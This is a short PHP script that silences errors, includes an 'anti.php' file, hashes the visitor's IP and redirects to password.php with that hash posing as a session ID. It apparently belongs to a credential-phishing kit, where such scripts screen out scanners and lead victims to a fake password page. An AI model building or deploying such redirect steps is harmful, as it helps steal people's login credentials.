<?php
error_reporting(0);
include '../anti.php';
session_start();



$ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($ip);

header("Location: password.php?&sessionid=$hash&ac=26");

?>